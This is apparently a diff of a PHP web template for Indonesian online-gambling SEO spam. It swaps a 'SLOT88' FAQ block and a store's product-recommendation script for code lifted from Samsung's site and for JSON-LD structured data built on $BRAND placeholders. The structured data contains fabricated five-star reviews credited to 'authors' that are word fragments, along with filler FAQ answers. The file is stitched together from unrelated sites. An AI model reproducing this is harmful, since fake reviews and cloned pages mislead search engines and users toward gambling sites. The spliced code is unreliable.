+					let nv07 = document.querySelector(".nv07-explore-floating-navigation");
+					nv07.parentElement.removeChild(nv07);
+				}
+				//CRHQ-9185 [B2C] shop app - DB 전환 건 - 쿠키 체크 및 미노출 처리      - 보완로직 
+				if(document.querySelector(".cod05-app-banner") != null && document.querySelector(".cod05-app-banner").style != null) {
+					document.querySelector(".cod05-app-banner").style.display='none';
+				} 
+				if(document.querySelector(".breadcrumb") != null && document.querySelector(".breadcrumb").style != null) {
+					document.querySelector(".breadcrumb").style.display='none';
+				}
+				if(document.querySelector(".nvd02-breadcrumb") != null && document.querySelector(".nvd02-breadcrumb").style != null) {
+					document.querySelector(".nvd02-breadcrumb").style.display='none';
+				}
+				if(document.querySelector(".nv17-breadcrumb") != null && document.querySelector(".nv17-breadcrumb").style != null) {
+					document.querySelector(".nv17-breadcrumb").style.display='none';
+				}
+				if(document.querySelector(".epp-breadcrumb") != null && document.querySelector(".epp-breadcrumb").style != null) {
+					document.querySelector(".epp-breadcrumb").style.display='none';
+				}
+				if(document.querySelector(".footer-column") != null && document.querySelector(".footer-column").style != null) {
+					document.querySelector(".footer-column").style.display='none';
+				}
+				if(("es" === "id" || "de" === "id") && document.querySelector(".footer-bottom") != null && document.querySelector(".footer-bottom").style != null) {
+					document.querySelector(".footer-bottom").style.display='none';
+				}
+				if(document.querySelector(".footer-language") != null && document.querySelector(".footer-language").style != null) {
+					document.querySelector(".footer-language").style.display='none';
+				}
+				if(document.querySelector(".footer-language__anchor") != null && document.querySelector(".footer-language__anchor").style != null) {
+					document.querySelector(".footer-language__anchor").style.display='none';
+				}
+				if(document.querySelector(".footer-language-wrap") != null && document.querySelector(".footer-language-wrap").style != null) {
+					document.querySelector(".footer-language-wrap").style.display='none';
+				}
+				if(document.querySelector(".footer-sns") != null && document.querySelector(".footer-sns").style != null) {
+					document.querySelector(".footer-sns").style.display='none';
+				}
+				if(document.querySelector(".footer-terms") != null && document.querySelector(".footer-terms").style != null) {
+					document.querySelector(".footer-terms").style.display='none';
+				}
+				if(document.querySelector("#teconsent") != null && document.querySelector("#teconsent").style != null) {
+					document.querySelector("#teconsent").style.display='none';
+				}
+				if(document.querySelector("#QSIFeedbackButton-btn") != null && document.querySelector("#QSIFeedbackButton-btn").style != null) {
+					document.querySelector("#QSIFeedbackButton-btn").style.display='none';
+				}
+				if (window.location.href.indexOf("https://www.samsung.com/mypage/myproducts/") > -1 || window.location.href.indexOf("https://www.samsung.com/mypage/myrepair/") > -1 || window.location.href.indexOf("https://www.samsung.com/mypage/rewards/") > -1
+						|| window.location.href.indexOf("https://www.samsung.com/mypage/myreferrals/") > -1 || window.location.href.indexOf("https://www.samsung.com/mypage/credits/") > -1) {
+					if(document.querySelector(".explore-lnb-navigation") != null && document.querySelector(".explore-lnb-navigation").style != null) {
+						document.querySelector(".explore-lnb-navigation").style.display='none';
+					}
+					if(document.querySelector(".nv-g-lnb") != null && document.querySelector(".nv-g-lnb").style != null) {
+						document.querySelector(".nv-g-lnb").style.display='none';
+					}
+					if(document.querySelector(".pd-g-floating-nav") != null && document.querySelector(".pd-g-floating-nav").style != null) {
+						document.querySelector(".pd-g-floating-nav").style.display='none';
+					}
+					document.querySelectorAll("#content a[target='_blank']").forEach(function(item){
+						item.removeAttribute('target');
+					});
+				}
+				if("page-standard-pd" === "page-buying-pd" || "page-buying-pd" === "page-buying-pd" || "page-feature-pd" === "page-buying-pd") {
+					if(document.querySelector(".pd-header-navigation__menu-epromoter-cta") != null && document.querySelector(".pd-header-navigation__menu-epromoter-cta").style != null) {
+						document.querySelector(".pd-header-navigation__menu-epromoter-cta").style.display='none';
+					}
+					if(document.querySelector(".product-detail-kv__cta-epromotor") != null && document.querySelector(".product-detail-kv__cta-epromotor").style != null) {
+						document.querySelector(".product-detail-kv__cta-epromotor").style.display='none';
+					}
+				}else if("page-bc-pd" === "page-buying-pd"){
+					document.querySelectorAll("#content .s-message-link").forEach(function(item){
+						item.style.display = "none";
+					});
+				}
+				if(document.querySelector(".cookie-bar__app-banner") != null && document.querySelector(".cookie-bar__app-banner").style != null) {
+					document.querySelector(".cookie-bar__app-banner").style.display='none';
+				}
+				if(document.querySelector(".cookie-bar") != null && document.querySelector(".cookie-bar").style != null) {
+					document.querySelector(".cookie-bar").style.display='none';
+				}
+				if(document.querySelector(".cod05-app-banner") != null && document.querySelector(".cod05-app-banner").style != null) {
+					document.querySelector(".cod05-app-banner").style.display='none';
+				}
+				//[EPP] Partner Bar 미노출 처리
+				if(document.querySelector(".partner-bar-wrap") != null && document.querySelector(".partner-bar-wrap").style != null) {
+					document.querySelector(".partner-bar-wrap").style.display='none';
+				}						
+				if(window.sg && window.sg.common && window.sg.common.utils){
+					window.sg.common.utils.visibleScroll();
+				}
+			}
 
-    <div class="cok-faq-item">
-      <button class="cok-faq-q">❓ Mengapa banyak pengguna memilih <?= $BRAND; ?> ft SLOT88?</button>
-      <div class="cok-faq-a">Banyak pengguna memilih <?= $BRAND; ?> ft SLOT88 karena menghadirkan pilihan permainan yang beragam, performa website yang stabil, tampilan yang ramah pengguna, proses transaksi yang praktis, serta pengalaman penggunaan yang nyaman melalui berbagai perangkat.</div>
-    </div>
+			let timerId = setInterval(() => {
+				if(isWebView){
+					hideHeaderFooterByWindowFlutterInappwebview();
+				}
+				if(window.location.href.indexOf("samsung.com.cn") > -1){ //cn국가인 경우
+					//추가된 userAgent 판단 로직
+					var ua = navigator.userAgent;
+					var ualower = ua.toLowerCase();
+					if(/micromessenger/.test(ualower)){ //userAgent include 'micromessenger'
+						if(/miniprogram/i.test(ualower)){ // 위챗 미니앱
+							//return 'wxApp';
+							hideHeaderFooterByWindowFlutterInappwebview();
+						}
+					}else if(/aliapp/i.test(ualower) && /miniprogram/i.test(ualower)){//userAgent include 'aliapp', 'miniprogram'
+						//return 'aliApp';// 알리 미니앱
+						hideHeaderFooterByWindowFlutterInappwebview();
+					}
+				}
+			}, 10);
+			setTimeout(() => {
+				clearInterval(timerId);
+			}, 20000);
 
-  </div>
+			const setSessionStorage = () => {
+				const isInAppWebViewSessionStorage = sessionStorage.getItem("isInAppWebViewSessionStorage");
+				if(!isInAppWebViewSessionStorage){
+					// readyCallback에서 세팅 (기존에 없는 경우만 세팅)
+					sessionStorage.setItem("isInAppWebViewSessionStorage", "true");
+				}
+			}
+
+			//new ShopAppUtil
+			let shopAppUtilInstance = new ShopAppUtil({
+				logger: true,
+				readyCallback: setSessionStorage
+			});
+
+			document.addEventListener("DOMContentLoaded", function () {
+				if(shopAppUtilInstance.isWebView() && typeof $ !== "undefined"){
+					$(document).off("click", 'a[target*="_blank"]');
+					$(document).on("click", 'a[target*="_blank"]', function (e) {
+						let href = $(this).attr("href");
+						if (!!href && href.indexOf("javascript") === -1 && href !== "#") {
+							if (href.startsWith("/" + siteCode + "/")) {
+								href = window.location.origin + href;
+							}
+							if (href.indexOf("index.html") === -1 && href.indexOf("index.html") === -1) {
+								href = "https://" + href;
+							}
+							if(href.indexOf("www.samsung.com") === -1){
+								e.preventDefault();
+								shopAppUtilInstance.openExternalBrowser(href);
+							}
+						}
+					});
+				}
+			});
+
+			//EMI 팝업에서 호출 확인 용 
+			function hideModalEmipopup() {
+					console.log("[from finance-popup.js] call hideModalEmipopup()!! ");
+					$('#wrap > div.finance-popup > div > div > div > button').click();
+			}
+			
+			function hideModalEmipopupConsole() {
+				console.log("dummy [from finance-popup.js] call hideModalEmipopup()!! ");
+					
+			}
+		
+			// App Login callback function
+			function login_completed (login_result, identifier) {
+				if("true" === login_result) {
+					if("nv-g-mini-cart.checkout" === identifier) {
+						location.href = window.sg.minicart.checkoutUrl;
+					}
+				}
+			}
+			
+			function login_completed_reload(login_result, identifier) {
+				if(login_result === "true") {
+					location.reload();
+				}
+			}
+      </script>
+      <script>
+       const searchParams = new URLSearchParams(location.search);
+			let appViewParam = searchParams.get('appView');
+			let sourceParam = searchParams.get('source');
+			if(appViewParam == "SM" || appViewParam == "ST" || appViewParam == "SA"){
+				window.sessionStorage.setItem("appView", appViewParam);
+				window.sessionStorage.setItem("source", sourceParam);
+			}
+
+			const rttHideHeaderFooterAppView = () => {
+				if(document.querySelector(".nv16-country-selector") != null && document.querySelector(".nv16-country-selector").style != null) {
+					document.querySelector(".nv16-country-selector").remove();
+				}
+				//$('.gnb').hide();
+				if(document.querySelector(".gnb") != null && document.querySelector(".gnb").style != null) {
+					document.querySelector(".gnb").style.display='none';
+				}
+				if(document.querySelector(".nv00-gnb") != null && document.querySelector(".nv00-gnb").style != null) {
+					document.querySelector(".nv00-gnb").style.display='none';
+				}
+				if(document.querySelector(".nv00-gnb-v3") != null && document.querySelector(".nv00-gnb-v3").style != null) {
+					document.querySelector(".nv00-gnb-v3").style.display='none';
+				}
+				if(document.querySelector(".nv00-gnb-v4") != null && document.querySelector(".nv00-gnb-v4").style != null) {
+					document.querySelector(".nv00-gnb-v4").style.display='none';
+				}
+				if(document.querySelector(".nv07-explore-floating-navigation") != null) {
+					let nv07 = document.querySelector(".nv07-explore-floating-navigation");
+					nv07.parentElement.removeChild(nv07);
+				}
+				if(document.querySelector(".cod05-app-banner") != null) {
+					document.querySelector(".cod05-app-banner").remove();
+				} 
+				if(document.querySelector(".breadcrumb") != null && document.querySelector(".breadcrumb").style != null) {
+					document.querySelector(".breadcrumb").style.display='none';
+				}
+				if(document.querySelector(".nvd02-breadcrumb") != null && document.querySelector(".nvd02-breadcrumb").style != null) {
+					document.querySelector(".nvd02-breadcrumb").style.display='none';
+				}
+				if(document.querySelector(".nv17-breadcrumb") != null && document.querySelector(".nv17-breadcrumb").style != null) {
+					document.querySelector(".nv17-breadcrumb").style.display='none';
+				}
+				if(document.querySelector(".epp-breadcrumb") != null && document.querySelector(".epp-breadcrumb").style != null) {
+					document.querySelector(".epp-breadcrumb").style.display='none';
+				}
+				if(document.querySelector(".footer-column") != null && document.querySelector(".footer-column").style != null) {
+					document.querySelector(".footer-column").style.display='none';
+				}
+				if(("es" === "id" || "de" === "id") && document.querySelector(".footer-bottom") != null && document.querySelector(".footer-bottom").style != null) {
+					document.querySelector(".footer-bottom").style.display='none';
+				}
+				if(document.querySelector(".footer-language") != null && document.querySelector(".footer-language").style != null) {
+					document.querySelector(".footer-language").style.display='none';
+				}
+				if(document.querySelector(".footer-language__anchor") != null && document.querySelector(".footer-language__anchor").style != null) {
+					document.querySelector(".footer-language__anchor").style.display='none';
+				}
+				if(document.querySelector(".footer-language-wrap") != null && document.querySelector(".footer-language-wrap").style != null) {
+					document.querySelector(".footer-language-wrap").style.display='none';
+				}
+				if(document.querySelector(".footer-sns") != null && document.querySelector(".footer-sns").style != null) {
+					document.querySelector(".footer-sns").style.display='none';
+				}
+				if(document.querySelector(".footer-terms") != null && document.querySelector(".footer-terms").style != null) {
+					document.querySelector(".footer-terms").style.display='none';
+				}
+				if(document.querySelector("#teconsent") != null && document.querySelector("#teconsent").style != null) {
+					document.querySelector("#teconsent").style.display='none';
+				}
+				if(document.querySelector("#QSIFeedbackButton-btn") != null && document.querySelector("#QSIFeedbackButton-btn").style != null) {
+					document.querySelector("#QSIFeedbackButton-btn").style.display='none';
+				}
+				// if (window.location.href.indexOf("/mypage/myproducts/") > -1 || window.location.href.indexOf("/mypage/myrepair/") > -1 || window.location.href.indexOf("/mypage/rewards/") > -1
+				// 		|| window.location.href.indexOf("/mypage/myreferrals/") > -1) {
+					if(document.querySelector(".explore-lnb-navigation") != null && document.querySelector(".explore-lnb-navigation").style != null) {
+						document.querySelector(".explore-lnb-navigation").style.display='none';
+					}
+					if(document.querySelector(".nv-g-lnb") != null && document.querySelector(".nv-g-lnb").style != null) {
+						document.querySelector(".nv-g-lnb").style.display='none';
+					}
+					if(document.querySelector(".pd-g-floating-nav") != null && document.querySelector(".pd-g-floating-nav").style != null) {
+						document.querySelector(".pd-g-floating-nav").style.display='none';
+					}
+					document.querySelectorAll("#content a[target='_blank']").forEach(function(item){
+						item.removeAttribute('target');
+					});
+				// }
+				if(document.querySelector(".cookie-bar__app-banner") != null && document.querySelector(".cookie-bar__app-banner").style != null) {
+					document.querySelector(".cookie-bar__app-banner").style.display='none';
+				}
+				if(document.querySelector(".cookie-bar") != null && document.querySelector(".cookie-bar").style != null) {
+					document.querySelector(".cookie-bar").style.display='none';
+				}
+				//[EPP] Partner Bar 미노출 처리
+				if(document.querySelector(".partner-bar-wrap") != null && document.querySelector(".partner-bar-wrap").style != null) {
+					document.querySelector(".partner-bar-wrap").style.display='none';
+				}						
+				if(window.sg && window.sg.common && window.sg.common.utils){
+					window.sg.common.utils.visibleScroll();
+				}
+			}
+
+			if(window.sessionStorage.getItem("appView") == "SM" || window.sessionStorage.getItem("appView") == "ST" || window.sessionStorage.getItem("appView") == "SA"){
+				let timerId = setInterval(rttHideHeaderFooterAppView, 10);
+				setTimeout(() => {
+					clearInterval(timerId);
+				}, 20000);
+			}
+      </script>
+      <script>
+       (window.BOOMR_mq=window.BOOMR_mq||[]).push(["addVar",{"rua.upush":"false","rua.cpush":"false","rua.upre":"false","rua.cpre":"false","rua.uprl":"false","rua.cprl":"false","rua.cprf":"false","rua.trans":"SJ-9c997744-ecab-4f72-ace8-7a7d6a06a0ee","rua.cook":"true","rua.ims":"false","rua.ufprl":"false","rua.cfprl":"false","rua.isuxp":"false","rua.texp":"norulematch","rua.ceh":"false","rua.ueh":"false","rua.ieh.st":"0"}]);
+      </script>
+      <script>
+       !function(){function o(n,i){if(n&&i)for(var r in i)i.hasOwnProperty(r)&&(void 0===n[r]?n[r]=i[r]:n[r].constructor===Object&&i[r].constructor===Object?o(n[r],i[r]):n[r]=i[r])}try{var n=decodeURIComponent("%7B%20%22request_client_hints%22%3A%20true%20%7D");if(n.length>0&&window.JSON&&"function"==typeof window.JSON.parse){var i=JSON.parse(n);void 0!==window.BOOMR_config?o(window.BOOMR_config,i):window.BOOMR_config=i}}catch(r){window.console&&"function"==typeof window.console.error&&console.error("mPulse: Could not parse configuration",r)}}();
+      </script>
+      <script>
+       !function(a){var e="https://s.go-mpulse.net/boomerang/",t="addEventListener";if("False"=="True")a.BOOMR_config=a.BOOMR_config||{},a.BOOMR_config.PageParams=a.BOOMR_config.PageParams||{},a.BOOMR_config.PageParams.pci=!0,e="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="VRZKC-5BSTD-4EWS3-R2J59-B8GYB",function(){function n(e){a.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!a.BOOMR||!a.BOOMR.version&&!a.BOOMR.snippetExecuted){a.BOOMR=a.BOOMR||{},a.BOOMR.snippetExecuted=!0;var i,_,o,r=document.createElement("iframe");if(a[t])a[t]("load",n,!1);else if(a.attachEvent)a.attachEvent("onload",n);r.src="javascript:void(0)",r.title="",r.role="presentation",(r.frameElement||r).style.cssText="width:0;height:0;border:0;display:none;",o=document.getElementsByTagName("script")[0],o.parentNode.insertBefore(r,o);try{_=r.contentWindow.document}catch(O){i=document.domain,r.src="javascript:var d=document.open();d.domain='"+i+"';void(0);",_=r.contentWindow.document}_.open()._l=function(){var a=this.createElement("script");if(i)this.domain=i;a.id="boomr-if-as",a.src=e+"VRZKC-5BSTD-4EWS3-R2J59-B8GYB",BOOMR_lstart=(new Date).getTime(),this.body.appendChild(a)},_.write("<bo"+'dy onload="document._l();">'),_.close()}}(),"".length>0)if(a&&"performance"in a&&a.performance&&"function"==typeof a.performance.setResourceTimingBufferSize)a.performance.setResourceTimingBufferSize();!function(){if(BOOMR=a.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var e="false"=="true"?1:0,t="cookiepresent",n="m72rctvyd7qdq2jknxoa-f-baf5d2a7a-clientnsv4-s.akamaihd.net",i="false"=="true"?2:1,_={"ak.v":"39","ak.cp":"154627","ak.ai":parseInt("293013",10),"ak.ol":"0","ak.cr":72,"ak.ipv":4,"ak.proto":"http/1.1","ak.rid":"1b1ca612","ak.r":40950,"ak.a2":e,"ak.m":"x","ak.n":"essl","ak.bpcip":"103.245.17.0","ak.cport":64329,"ak.gh":"23.56.239.149","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.0rtt.ed":"","ak.csrc":"-","ak.acc":"bbr","ak.t":"1764388316","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==YxD3wWwm2/ecfEKXD3psVx01x5XDGEWQ7TTrx8a9R+9oKO6+ya2Vjr/FvpaXBc9NBVoe+z1zi9asFC2zD850P4FfZgmLwa00rIafMmq32RrGuzD5bbh99qxENi/ymMyaGjTI5/ZviD+5yX6H87XT8GscRLtGat2wwiUoeuvaKtuRbA43Um32rQWA/Fls8GX/EXh5mdb4DhOVZ429EIkGFUrnKu5sbANJpWWtcqDygI3DZ+Rvqw1ShVXrmBeMdxOlNEUinLdnwmNGjUFV9hJzm41dS5rO5urC3mtnzxRl0dDFdjwvmqxp3DTBsI+jE8dILj0+Kx2s6frG4CZRTdsp2V0odxH5nQ6YnPhepXeWUTukhvSvNZzUpOUsHfk9CjeipFCTvV0qoqRcnF4zzgogepDPFXu31kCk4gIDbKOkyB4=","ak.pv":"4137","ak.dpoabenc":"","ak.tf":i};if(""!==t)_["ak.ruds"]=t;var o={i:!1,av:function(e){var t="http.initiator";if(e&&(!e[t]||"spa_hard"===e[t]))_["ak.feo"]=void 0!==a.aFeoApplied?1:0,BOOMR.addVar(_)},rv:function(){var a=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.html","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.0rtt.ed","ak.r","ak.acc","ak-2.html","ak.tf"];BOOMR.removeVar(a)}};BOOMR.plugins.AK={akVars:_,akDNSPreFetchDomain:n,init:function(){if(!o.i){var a=BOOMR.subscribe;a("before_beacon",o.av,null,null),a("onbeacon",o.rv,null,null),o.i=!0}return this},is_complete:function(){return!0}}}}()}(window);
+      </script>
+     </link>
+    </link>
+   </link>
+  </link>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+
+    {
+      "@type": "WebSite",
+      "@id": "<?= $canonical; ?>",
+      "url": "<?= $canonical; ?>",
+      "name": "<?= $BRAND; ?> x <?= $BRAND2; ?>",
+      "inLanguage": "id-ID",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": "<?= $canonical; ?>?q={search_term_string}",
+        "query-input": "required name=search_term_string"
+      }
+    },
 
 
-  <!-- ========================= CSS ========================= -->
 
-  <style>
-  /* === TITLE MATCH COLOR WITH FAQ === */
-  .cok-faq-title {
-    text-align: center;
-    color: #000000;
-    font-size: 32px;
-    margin-top: 25px;
-    margin-bottom: 25px;
-    font-weight: 800;
-    font-family: "Segoe UI", sans-serif;
-    text-shadow: 0 0 12px #000000aa, 0 0 20px #3d3d3d55;
-    letter-spacing: 1px;
+    {
+      "@type": "Organization",
+      "@id": "<?= $canonical; ?>",
+      "name": "<?= $BRAND; ?> x <?= $BRAND2; ?>",
+      "url": "<?= $canonical; ?>",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "<?= $logo; ?>"
+      },
+      "sameAs": [
+        "https://www.facebook.com/<?= $BRAND; ?> x <?= $BRAND2; ?>",
+        "https://www.twitter.com/<?= $BRAND; ?> x <?= $BRAND2; ?>",
+        "https://instagram.com/<?= $BRAND; ?> x <?= $BRAND2; ?>",
+        "https://line.me/ti/p/<?= $BRAND; ?> x <?= $BRAND2; ?>"
+      ]
+    },
+
+
+
+    {
+      "@type": "WebPage",
+      "@id": "<?= $canonical; ?>",
+      "url": "<?= $canonical; ?>",
+      "name": "<?= $title; ?>",
+      "isPartOf": { "@id": "<?= $canonical; ?>" },
+      "about": { "@id": "<?= $canonical; ?>" },
+      "breadcrumb": { "@id": "<?= $canonical; ?>" },
+      "inLanguage": "id-ID"
+    },
+
+
+
+    {
+      "@type": "Article",
+      "@id": "<?= $canonical; ?>",
+      "headline": "<?= $title; ?>",
+      "description": "<?= $description; ?>",
+      "image": {
+        "@type": "ImageObject",
+        "url": "<?= $image; ?>"
+      },
+      "datePublished": "2026-08-06T01:41:45+07:00",
+      "dateModified": "2026-08-06T01:41:45+07:00",
+      "author": {
+        "@type": "Organization",
+        "name": "DESAJP11"
+      },
+      "publisher": { "@id": "<?= $canonical; ?>" },
+      "mainEntityOfPage": { "@id": "<?= $canonical; ?>" },
+      "inLanguage": "id-ID"
+    },
+
+
+
+    {
+      "@type": "BreadcrumbList",
+      "@id": "<?= $canonical; ?>",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "<?= $BRAND; ?> x <?= $BRAND2; ?>",
+          "item": "<?= $canonical; ?>"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Dunia Game Digital Yang",
+          "item": "<?= $canonical; ?>"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Game Digital Yang Setiap",
+          "item": "<?= $canonical; ?>"
+        },
+        {
+          "@type": "ListItem",
+          "position": 4,
+          "name": "Digital Yang Setiap Detiknya",
+          "item": "<?= $canonical; ?>"
+        },
+        {
+          "@type": "ListItem",
+          "position": 5,
+          "name": "Yang Setiap Detiknya Punya",
+          "item": "<?= $canonical; ?>"
+        },
+        {
+          "@type": "ListItem",
+          "position": 6,
+          "name": "Setiap Detiknya Punya Kejutan",
+          "item": "<?= $canonical; ?>"
+        }
+      ]
+    },
+
+
+
+    {
+      "@type": "FAQPage",
+      "@id": "<?= $canonical; ?>",
+      "mainEntity": [
+
+        {
+          "@type": "Question",
+          "name": "Hal apa yang paling menonjol dari <?= $title; ?>?",
+          "acceptedAnswer": { "@type": "Answer", "text": "Bagian paling menonjol dari <?= $title; ?> adalah pembahasannya yang relevan dengan kebutuhan pembaca dan mudah dipahami dari berbagai sudut pandang." }
+        },
+
+        {
+          "@type": "Question",
+          "name": "Bagaimana cara memahami informasi utama tentang <?= $title; ?>?",
+          "acceptedAnswer": { "@type": "Answer", "text": "Informasi utama tentang <?= $title; ?> bisa dipahami dengan melihat konteks judul, manfaat yang ditawarkan, serta poin penting yang dibahas di dalam artikel." }
+        },
+
+        {
+          "@type": "Question",
+          "name": "Mengapa <?= $BRAND; ?> x <?= $BRAND2; ?> sering dikaitkan dengan topik ini?",
+          "acceptedAnswer": { "@type": "Answer", "text": "<?= $BRAND; ?> x <?= $BRAND2; ?> sering dikaitkan dengan topik ini karena menjadi bagian dari pembahasan utama yang membantu memperjelas arah informasi." }
+        },
+
+        {
+          "@type": "Question",
+          "name": "Apa yang perlu diperhatikan sebelum memilih referensi tentang <?= $title; ?>?",
+          "acceptedAnswer": { "@type": "Answer", "text": "Pembaca perlu memperhatikan relevansi informasi, kejelasan isi, dan kesesuaian pembahasan dengan kebutuhan mereka." }
+        },
+
+        {
+          "@type": "Question",
+          "name": "Bagaimana pembaca bisa mendapatkan gambaran yang lebih jelas tentang <?= $title; ?>?",
+          "acceptedAnswer": { "@type": "Answer", "text": "Gambaran yang lebih jelas bisa didapat dengan membaca poin utama secara bertahap, membandingkan informasi, dan memahami konteks keseluruhan artikel." }
+        }
+
+      ]
+    },
+
+
+
+    {
+      "@type": "Review",
+      "@id": "<?= $canonical; ?>",
+      "author": { "@type": "Person", "name": "dunia game digital yang" },
+      "reviewRating": { "@type": "Rating", "ratingValue": "5", "bestRating": "5", "worstRating": "1" },
+      "reviewBody": "Menurut saya pembahasan tentang <?= $title; ?> terasa rapi, mudah diikuti, dan cukup membantu untuk memahami poin pentingnya.",
+      "itemReviewed": { "@id": "<?= $canonical; ?>" }
+    },
+
+    {
+      "@type": "Review",
+      "@id": "<?= $canonical; ?>",
+      "author": { "@type": "Person", "name": "game digital yang setiap" },
+      "reviewRating": { "@type": "Rating", "ratingValue": "5", "bestRating": "5", "worstRating": "1" },
+      "reviewBody": "Informasinya enak dibaca karena alurnya jelas dan pembaca bisa langsung menangkap inti dari <?= $title; ?>.",
+      "itemReviewed": { "@id": "<?= $canonical; ?>" }
+    },
+
+    {
+      "@type": "Review",
+      "@id": "<?= $canonical; ?>",
+      "author": { "@type": "Person", "name": "digital yang setiap detiknya" },
+      "reviewRating": { "@type": "Rating", "ratingValue": "5", "bestRating": "5", "worstRating": "1" },
+      "reviewBody": "Saya suka cara artikel ini menjelaskan <?= $title; ?> karena tidak bertele-tele dan tetap terasa natural.",
+      "itemReviewed": { "@id": "<?= $canonical; ?>" }
+    },
+
+    {
+      "@type": "Review",
+      "@id": "<?= $canonical; ?>",
+      "author": { "@type": "Person", "name": "yang setiap detiknya punya" },
+      "reviewRating": { "@type": "Rating", "ratingValue": "5", "bestRating": "5", "worstRating": "1" },
+      "reviewBody": "Topik <?= $title; ?> dibahas dengan gaya yang sederhana namun tetap memberi gambaran yang lengkap.",
+      "itemReviewed": { "@id": "<?= $canonical; ?>" }
+    },
+
+    {
+      "@type": "Review",
+      "@id": "<?= $canonical; ?>",
+      "author": { "@type": "Person", "name": "setiap detiknya punya kejutan" },
+      "reviewRating": { "@type": "Rating", "ratingValue": "5", "bestRating": "5", "worstRating": "1" },
+      "reviewBody": "Ulasan ini cukup membantu karena membuat <?= $title; ?> terasa lebih mudah dipahami oleh pembaca baru.",
+      "itemReviewed": { "@id": "<?= $canonical; ?>" }
+    }
+
+  ]
+}
+</script>
+ <style>
+  .nv00-gnb-v4__l0-menu-text,
+  .nv00-gnb-v4__l1-menu-text,
+  .nv00-gnb-v4__l1-featured-link,
+  .nv00-gnb-v4__l1-featured-title {
+    font-size: 14.5px;
+    line-height: 1.4;
   }
 
-  /* === FAQ CONTAINER === */
-  .cok-faq {
-    max-width: 1200px;
-    margin: 10px auto 40px auto;
-    font-family: "Segoe UI", sans-serif;
-  }
-
-  /* === QUESTION BUTTON === */
-  .cok-faq-q {
-    width: 100%;
-    padding: 14px;
-    background: #0b0f1a;
-    color: #00b7ff;
-    font-weight: bold;
-    border: 1px solid #3d3d3d55;
-    border-radius: 8px;
-    cursor: pointer;
-    text-align: left;
-    margin-bottom: 8px;
-    transition: .25s ease;
-    box-shadow: 0 0 10px #00000022;
-  }
-
-  .cok-faq-q:hover {
-    background: #320909;
-    box-shadow: 0 0 15px #00000044;
-  }
-
-  /* === ANSWER BOX === */
-  .cok-faq-a {
-    max-height: 0;
-    overflow: hidden;
-    background: #230f0f;
-    color: #e6faff;
-    margin-top: -5px;
-    border-radius: 0 0 8px 8px;
-    padding: 0 14px;
-    border-left: 1px solid #00000033;
-    border-right: 1px solid #00000033;
-    border-bottom: 1px solid #00000033;
-    transition: max-height .35s ease, padding .25s ease;
-    box-shadow: inset 0 0 10px #00000022;
-  }
-
-  .cok-faq-a.open {
-    max-height: 500px;
-    padding: 14px;
-  }
-
-  /* === RESPONSIVE === */
-  @media (max-width: 480px) {
-    .cok-faq-title {
-      font-size: 26px;
+  /* Biar di HP tetap kebaca, naikin dikit */
+  @media (max-width: 768px) {
+    .nv00-gnb-v4__l0-menu-text,
+    .nv00-gnb-v4__l1-menu-text,
+    .nv00-gnb-v4__l1-featured-link,
+    .nv00-gnb-v4__l1-featured-title {
+      font-size: 13px;
     }
   }
-  </style>
-
-  <!-- ========================= JS ========================= -->
-
-  <script>
-  document.querySelectorAll(".cok-faq-q").forEach(btn => {
-    btn.addEventListener("click", () => {
-      let answer = btn.nextElementSibling;
-      answer.classList.toggle("open");
-    });
-  });
-  </script>
-
-              <link rel="stylesheet" href="https://www.istudiosg.com/cdn/shop/t/14/assets/product-scratch.css?v=179858087556892581742784887" media="print" onload="this.media='all'">
-              <div class="frequent-products">
-                <product-recommendations
-                    class="product-recommendations1 page-width section-template--17605519376564__frequently-bought-products-padding isolate"
-                    data-url="/recommendations/products?section_id=template--17605519376564__frequently-bought-products&product_id=7986665160884&limit=3"
-                    >
-                    <div
-                      class="product-recommendations__cta hidden"
-                      style="height:0px;"
-                      >
-                      <input type="hidden" id="prod_currency" value="SGD">
-                      <button
-                          type="submit"
-                          class="button-cart-frequent card-btn-1 product-form__submit button button--full-width js-frequent-submit"
-                          id="card-button"
-                          class="frq-card-btn"
-                          >
-                          Add&nbsp; <span id="checked-products"> </span> &nbsp;Items to Cart
-                          <div class="loading-overlay__spinner-frequent hidden">
-                            <svg
-                                aria-hidden="true"
-                                focusable="false"
-                                role="presentation"
-                                class="spinner"
-                                viewBox="0 0 66 66"
-                                xmlns="http://www.w3.org/2000/svg"
-                                >
-                                <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
-                            </svg>
-                          </div>
-                      </button>
-                    </div>
-                </product-recommendations>
-              </div>
-              <script>
-                class ProductRecommendations extends HTMLElement {
-                  constructor() {
-                    super();
-                    this.config = {
-                      dom: {
-                        button: '.js-frequent-submit',
-                        input: '.js-frequent-products-checkbox',
-                        selected: 'input[name="frequent-products-pdp"]:checked',
-                      },
-                      cls: {
-                        hide: 'hide',
-                      },
-                    };
-                    const handleIntersection = (entries, observer) => {
-                      if (!entries[0].isIntersecting) return;
-                      observer.unobserve(this);
-                      fetch(this.dataset.url)
-                        .then((response) => response.text())
-                        .then((text) => {
-                          const html = document.createElement('div');
-                          html.innerHTML = text;
-                          const recommendations = html.querySelector('product-recommendations');
-                          if (recommendations && recommendations.innerHTML.trim().length) {
-                            this.innerHTML = recommendations.innerHTML;
-                          }
-                          if (html.querySelector('.grid__item')) {
-                            this.classList.add('product-recommendations--loaded');
-                          }
-                
-                          this.addEvent();
-                          call_gafunction();
-                        })
-                        .catch((e) => {
-                          console.error(e);
-                        });
-                    };
-                    new IntersectionObserver(handleIntersection.bind(this), { rootMargin: '0px 0px 200px 0px' }).observe(this);
-                  }
-                  hideButton(el) {
-                    if (!el) return;
-                    el.classList.add(this.config.cls.hide);
-                  }
-                  showButton(el) {
-                    if (!el) return;
